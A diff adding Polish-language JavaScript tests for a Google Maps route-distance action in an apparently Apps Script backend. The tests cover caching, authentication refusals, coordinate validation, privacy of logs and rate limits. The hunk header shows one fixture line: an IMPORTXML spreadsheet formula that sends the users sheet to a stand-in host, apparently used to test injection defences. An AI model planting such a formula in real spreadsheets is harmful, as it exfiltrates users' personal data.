@@ -385,4 +385,44 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
     S.post({ akcja: 'miejscowosci', kod: '12345', miesiac: M, op: 'zapisz', miejscowosci: ['Radom'] }, { haslo: 'haslo123' });
     ok('przycinanie: stare miesiące (sprzed 14) znikają, świeże i nowy wpis zostają', sh.w.length === 1 + 10 + 1 && sh.w.every((r, i) => i === 0 || Number(r[0]) >= Number(M) - 100), String(sh.w.length)); }
 }
+/* ---- 17. drogi z Google Maps (akcja „droga”): dokładny odcinek z adresu zamieszkania ---- */
+{
+  const B = swiezy(); const H1 = { haslo: 'haslo123' };
+  const dr = (pary, o = H1, kodu = '12345') => B.post({ akcja: 'droga', kod: kodu, pary }, o);
+  const RADOM = [51.4027, 21.1471], KIELCE = [50.8661, 20.6286], LUBLIN = [51.2465, 22.5684], PULAWY = [51.4166, 21.9697];
+  const prosta = (a, b) => { const p = Math.PI / 180; return 6371 * Math.hypot((b[1] - a[1]) * p * Math.cos((a[0] + b[0]) * p / 2), (b[0] - a[0]) * p); };
+  const r1 = dr([[...RADOM, ...KIELCE], [...RADOM, ...LUBLIN], [...RADOM, ...PULAWY]]);
+  ok('trzy odcinki: wynik ze wszystkich (km z usługi Maps, minuty), bez „limit”', r1.status === 'ok' && r1.limit === false && r1.wyniki.length === 3 && r1.wyniki.every(x => x && x.km > 0 && x.min > 0) && B.maps.wywolania === 3, JSON.stringify(r1).slice(0, 160));
+  ok('km zgadzają się z usługą (linia prosta × 1,25, zaokrąglone do 0,1 km)', Math.abs(r1.wyniki[0].km - prosta(RADOM, KIELCE) * 1.25) < 0.06, String(r1.wyniki[0].km));
+  const przed = B.maps.wywolania; const r2 = dr([[...KIELCE, ...RADOM], [...RADOM, ...LUBLIN]]);
+  ok('ta sama para (także w odwrotnym kierunku) wraca z pamięci skryptu — usługa Maps nie jest pytana drugi raz', B.maps.wywolania === przed && r2.wyniki[0].km === r1.wyniki[0].km && r2.wyniki[1].km === r1.wyniki[1].km);
+  const z0 = B.blokada.zwolnien; B.maps.zwolnieniaPrzyWywolaniu.length = 0; const w0 = B.maps.wywolania;
+  dr([[...PULAWY, ...LUBLIN]]);
+  ok('blokada jest zwolniona PRZED zapytaniem do Google (logowanie innych nie czeka na Maps) i tylko raz', B.maps.wywolania === w0 + 1 && B.maps.zwolnieniaPrzyWywolaniu[0] === z0 + 1 && B.blokada.zwolnien === z0 + 1, `${B.maps.zwolnieniaPrzyWywolaniu[0]} / ${z0} / ${B.blokada.zwolnien}`);
+  const odm = [['sam kod, bez podpisu hasłem', {}, '12345'], ['zły podpis hasłem', { haslo: 'zle-haslo' }, '12345'], ['nieznany kod', H1, '99999'], ['cudze hasło', { haslo: 'haslo123' }, '22222']];
+  const wMaps = B.maps.wywolania;
+  for (const [opis, o, kodu] of odm) { const r = dr([[...RADOM, ...KIELCE]], o, kodu); ok(`odmowa bez wyników: ${opis}`, r.status === 'odmowa' && !('wyniki' in r), JSON.stringify(r)); }
+  ok('konto wygasłe (33333) dostaje „wygasla”, a Google nie jest pytany', dr([[...RADOM, ...KIELCE]], H1, '33333').status === 'wygasla' && B.maps.wywolania === wMaps);
+  const zle = [['poza Polską (Berlin)', [[52.52, 13.405, ...RADOM]]], ['poza Polską (Wiedeń)', [[...RADOM, 48.2082, 16.3738]]], ['odcinek za długi (Gdańsk–Zakopane)', [[54.352, 18.6466, 49.2992, 19.9496]]], ['pusta lista', []], ['para nie jest czwórką liczb', [[1, 2, 3]]],
+    ['współrzędne jako napisy', [['51.4', '21.1', '50.8', '20.6']]], ['NaN', [[NaN, 21.1, ...KIELCE]]], ['za dużo par (61)', Array.from({ length: 61 }, () => [...RADOM, ...KIELCE])], ['nie tablica', 'Radom-Kielce']];
+  for (const [opis, pary] of zle) { const r = dr(pary); ok(`błąd zamiast zapytania do Google: ${opis}`, r.status === 'blad' && B.maps.wywolania === wMaps, JSON.stringify(r).slice(0, 90)); }
+  ok('współrzędne nie trafiają do arkusza ani do dziennika (tylko liczba par)', !JSON.stringify([...B.zak.values()].map(z => z.w)).match(/51\.40|21\.14|50\.86|20\.62|22\.56/) && B.get('Log').w.some(r => r[2] === 'droga' && /par/.test(r[3])));
+  { const S = swiezy(); S.maps.odpowiedz = (a, b) => ({ status: 'OK', routes: [{ legs: [{ distance: { value: prosta(a, b) * 6000 }, duration: { value: 3600 } }] }] });
+    const r = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...KIELCE]] }, H1); ok('niedorzeczny wynik z Google (6× linia prosta) → null (aplikacja zostaje przy tabeli)', r.status === 'ok' && r.wyniki[0] === null, JSON.stringify(r).slice(0, 100));
+    S.maps.odpowiedz = () => ({ status: 'ZERO_RESULTS', routes: [] }); const r3 = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...LUBLIN]] }, H1); ok('brak trasy w Google → null, bez błędu serwera', r3.status === 'ok' && r3.wyniki[0] === null); }
+  { const S = swiezy(); S.maps.wyjatek = true;
+    const r = S.post({ akcja: 'droga', kod: '12345', pary: [[...RADOM, ...KIELCE], [...RADOM, ...LUBLIN]] }, H1);
+    ok('wyczerpany dzienny limit usługi Maps → status ok, limit:true, wyniki null (bez błędu serwera)', r.status === 'ok' && r.limit === true && r.wyniki.every(x => x === null), JSON.stringify(r).slice(0, 120)); }
+  { const S = swiezy(); const mnog = (i) => [51.4 + i * 0.001, 21.1, ...KIELCE];
+    const por = od => S.post({ akcja: 'droga', kod: '12345', pary: Array.from({ length: 60 }, (_, i) => mnog(od + i)) }, H1);
+    const a = por(0), a2 = por(100), b2 = por(200);
+    ok('limit na konto (160 nowych par w oknie): dwa zapytania po 60 policzone, z trzeciego tylko 40, reszta null i limit:true', a.limit === false && a2.limit === false && a.wyniki.every(Boolean) && a2.wyniki.every(Boolean) && b2.limit === true && b2.wyniki.filter(Boolean).length === 40 && S.maps.wywolania === 160, `${S.maps.wywolania} wywołań, limit ${b2.limit}`);
+    const c = S.post({ akcja: 'droga', kod: '22222', pary: [[...RADOM, ...KIELCE]] }, { haslo: '501502503' });
+    ok('limit jednego konta nie blokuje innych (konto bez hasła dostaje odmowę, nie limit)', c.status === 'odmowa'); }
+  { const S = swiezy(); S.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'drugie-haslo9' });
+    const sw = k => ({ akcja: 'droga', kod: k, pary: Array.from({ length: 60 }, (_, i) => [51.4 + i * 0.0013, (k === '12345' ? 21.2 : 21.6) + i * 0.0001, ...KIELCE]) });
+    S.post(sw('12345'), H1); S.post(sw('22222'), { haslo: 'drugie-haslo9' });
+    ok('dwa konta liczą osobno, a wspólny bezpiecznik (240 par) jeszcze nie zadziałał', S.maps.wywolania === 120); }
+  ok('autoryzujMapy() uruchamia się i zwraca odcinek Radom–Kielce', (() => { const x = B.wywolaj('autoryzujMapy()'); return x && x.km > 70 && x.km < 120; })());
+}
 process.exit(kod);
